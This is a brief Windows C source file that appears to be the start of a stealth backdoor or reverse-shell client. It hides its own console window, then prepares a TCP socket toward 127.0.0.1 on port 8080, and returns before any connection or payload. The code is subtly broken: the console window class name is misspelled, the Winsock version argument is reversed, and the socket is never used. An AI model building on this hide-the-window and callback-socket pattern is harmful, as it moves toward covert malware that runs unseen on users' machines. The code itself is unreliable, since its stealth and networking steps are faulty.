#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>


SOCKET sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	
	HWND stealth;
	AllocConsole();

	stealth = FindWindowA("ConsoleWindowsClass", NULL); //Retrieve handle to the top level window.
	ShowWindow(stealth, 0); // Zero means hide the window.
	
	struct sockaddr_in SrvAddr;
	unsigned short SrvPort;
	char* SrvIP;
	WSADATA wsaData;

	SrvIP = "127.0.0.1";
	SrvPort = 8080;

	if (WSAStartup(MAKEWORD(0, 2), &wsaData) != 0) { //First function to check and set winsock version.
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&SrvAddr, 0, sizeof(SrvAddr));

	return 0;

}